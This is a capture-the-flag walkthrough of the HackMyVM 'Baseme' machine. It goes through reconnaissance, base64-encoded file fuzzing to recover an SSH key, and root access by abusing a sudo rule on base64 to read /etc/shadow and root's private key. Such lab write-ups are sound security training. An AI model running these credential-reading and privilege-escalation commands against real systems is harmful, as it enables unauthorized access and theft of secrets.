# HackMyVM - Baseme (Easy) Walkthrough

> **Platform:** HackMyVM  
> **Machine:** Baseme  
> **Difficulty:** Easy  
> **Category:** Linux  
> **Author:** Kabir

---

# Objective

The goal of this machine is to gain initial access by identifying how Base64 is used throughout the target and then leverage a misconfigured sudo permission to escalate privileges to root.

---

# Reconnaissance

Unlike many other HackMyVM machines, this one does **not** display the target IP address on the login banner.

## Step 1 - Discover the Target IP

We begin by identifying hosts on our VirtualBox network using **netdiscover**.

```bash
netdiscover -i eth1
```

### Q1

> **Machine Boot Screen**

![Machine](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q1.png)

---

The scan discovers three hosts.

```
Currently scanning: 192.168.0.0/16

IP              MAC Address
-----------------------------------------
192.168.56.1
192.168.56.100
192.168.56.134
```

The target machine is:

```
192.168.56.134
```

### Q2

> **Netdiscover Output**

![Netdiscover](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q2.png)

---

# Port Scanning

Now that the target IP has been identified, perform a full TCP port scan.

```bash
nmap -p- 192.168.56.134
```

Result:

```
22/tcp open ssh
80/tcp open http
```

### Q3

> **All Port Scan**

![Nmap All Ports](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q3.png)

---

## Service Enumeration

Next, enumerate services and versions.

```bash
nmap -sC -sV 192.168.56.134
```

Results:

| Port | Service | Version |
|-------|----------|----------|
|22|SSH|OpenSSH 7.9p1 Debian|
|80|HTTP|nginx 1.14.2|

The HTTP service appears to host a very minimal webpage.

### Q4

> **Service Detection**

![Nmap Service Scan](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q4.png)

---

# Web Enumeration

Since port **80** is available, we begin investigating the web application.

The page itself contains what appears to be an obfuscated Base64 string.

### Q5

> **Initial Webpage**

![Homepage](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q5.png)

---

The webpage contains:

```
QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK
```

Decoding with CyberChef (or using `base64 -d`) reveals:

```
ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.

-lucas
```

This message is the biggest hint in the challenge.

- Everything revolves around **Base64**
- We now know a username: **lucas**

### Q6

> **CyberChef Decode**

![CyberChef](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q6.png)

---

# Attempting SSH Access

Using the discovered username, several login attempts were made over SSH.

```
Username: lucas
```

However, none of the obvious passwords were accepted.

Instead of brute forcing immediately, we continue enumerating the web application.

---

# Viewing Page Source

Inspecting the webpage source reveals an HTML comment.

```html
<!--
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
-->
```

These appear to be potential passwords.

### Q7

> **Page Source**

![Source Code](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q7.png)

---

Our initial assumption was simple:

- Convert each password into Base64
- Attempt SSH login

Although this idea aligns with the earlier hint, every generated password failed.

Rather than continuing down this path, further enumeration was required.

---

# Directory and File Fuzzing

Standard directory fuzzing produced no useful findings.

Considering the webpage explicitly stated that **everything is Base64**, it made sense that filenames themselves might also be Base64 encoded.

To test this theory, we converted an entire wordlist into Base64.

```bash
while IFS= read -r line
do
    echo "$line" | base64 >> dic-base64.txt
done < /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

This generated a Base64 version of the original wordlist.

### Q8

> **Preparing Base64 Wordlist**

![Wordlist](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q8.png)

---

Running Feroxbuster with the encoded wordlist finally produced interesting results.

```
200 /
200 /cm9ib3RzLnR4dAo=
```

### Q9

> **Base64 File Discovery**

![Feroxbuster](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q10.png)

---

Decoding the filename:

```bash
echo "cm9ib3RzLnR4dAo=" | base64 -d
```

Output:

```
robots.txt
```

Unfortunately this turned out to be a rabbit hole.

Downloading it gives:

```
Tm90aGluZyBoZXJlIDooCg==
```

Decoding:

```
Nothing here :(
```

### Q10

> **robots.txt**

![robots]([q10](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q10.png))

---

# Continuing Enumeration

Since the previous result was intentionally misleading, a much larger wordlist was used.

Eventually another Base64 encoded filename appeared.

```
aWRfcnNhCg==
```

Decoding:

```bash
echo "aWRfcnNhCg==" | base64 -d
```

Output:

```
id_rsa
```

This was far more interesting.

Downloading the file also returned Base64 encoded content, which was decoded to recover an SSH private key.

### Q11

> **Recovered id_rsa**

![id_rsa](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q11.png)

---

# Initial Access

Remember the password list from the page source?

One of those entries becomes valid after Base64 encoding.

```
iloveyou
```

↓

```
aWxvdmV5b3UK
```

Using this encoded password together with the recovered SSH key successfully authenticates as **lucas**.

Once logged in, retrieve the user flag.

### Q12

> **User Flag**

![user](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q12.png)

---

# Privilege Escalation

The first step after obtaining a shell is checking sudo permissions.

```bash
sudo -l
```

Output:

```
User lucas may run the following commands on baseme:

(ALL) NOPASSWD: /usr/bin/base64
```

### Q13

> **sudo -l**

![sudo](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q13.png)

---

# Exploiting Base64 Sudo Permission

Since Base64 can read any file supplied to it, we can abuse sudo to read privileged files.

For example:

```bash
sudo /usr/bin/base64 /etc/shadow | base64 -d
```

Output includes:

```
root:$6$WpK4X6fHp6EJ4Ps9$...
```

This allows extraction of the root password hash.

### Q14

> **Reading /etc/shadow**

![shadow](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q14.png)

---

# Alternative Root Method

An even cleaner approach is reading root's private SSH key.

```bash
sudo base64 /root/.ssh/id_rsa | base64 -d > id_rsa_root

chmod 600 id_rsa_root

ssh root@192.168.56.134 -i id_rsa_root
```

This immediately grants a root shell.

```
root@baseme:~#
```

Retrieve the final flag.

```
HMVFKBS64
```

### Q15

> **Root Flag**

![root](https://github.com/naval0505/HackMyVM/blob/237f40a64151ab1bffeca2cf866b4d544082bab3/BaseMe%20-%20HackMyVM%20Machine%20Writeup/images/q15.png)

---

# Attack Path Summary

```
Network Discovery
        │
        ▼
Netdiscover
        │
        ▼
Nmap Enumeration
        │
        ▼
HTTP Service
        │
        ▼
Base64 Hint
        │
        ▼
Page Source Enumeration
        │
        ▼
Base64 Wordlist Creation
        │
        ▼
Feroxbuster
        │
        ▼
Discover Encoded Files
        │
        ▼
Recover id_rsa
        │
        ▼
SSH as lucas
        │
        ▼
sudo -l
        │
        ▼
NOPASSWD: base64
        │
        ▼
Read Protected Files
        │
        ▼
Recover Root SSH Key
        │
        ▼
Root Shell
```

---

# Key Takeaways

- Never ignore challenge hints; in this machine, **Base64** was the central theme from start to finish.
- Source code inspection remains one of the most valuable enumeration techniques.
- When traditional fuzzing fails, consider transforming your payloads based on application logic or clues.
- Misconfigured sudo permissions on seemingly harmless binaries such as `base64` can lead to complete system compromise.
- GTFOBins should always be consulted whenever unusual binaries are permitted through sudo.

---

# Tools Used

- Netdiscover
- Nmap
- Burp Suite
- CyberChef
- Feroxbuster
- Base64
- SSH
- Linux Terminal

---

# Flags

**User**

```
[USER FLAG REDACTED]
```

**Root**

```
HMVFKBS64
```

---

## Machine Status

**Machine:** Baseme  
**Difficulty:** Easy  
**Operating System:** Linux

**Owned Successfully**
